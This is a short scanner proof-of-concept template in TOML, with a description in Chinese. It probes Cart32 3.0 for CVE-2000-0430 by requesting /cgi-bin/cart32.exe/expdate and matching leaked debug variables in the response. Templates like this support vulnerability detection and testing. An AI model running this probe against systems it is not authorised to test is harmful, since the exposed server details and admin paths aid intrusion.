[info]
author = "ave"
description = "通过向 Cart32 3.0 的 cart32.exe 发送附加 /expdate 路径的 HTTP 请求，检测是否存在敏感调试信息泄露漏洞。若服务器返回包含调试变量、管理目录路径等敏感信息的页面，则判定存在漏洞。"
id = "POC-AVE-2000-0353"
name = "Cart32 3.0 expdate 敏感调试信息泄露漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0353"]
vuln_id = [
    "CVE-2000-0430",
    "AVE-2000-0353",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/cart32.exe/expdate"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "SERVER_SOFTWARE",
    "SERVER_NAME",
    "HTTP_HOST",
    "cart32",
]
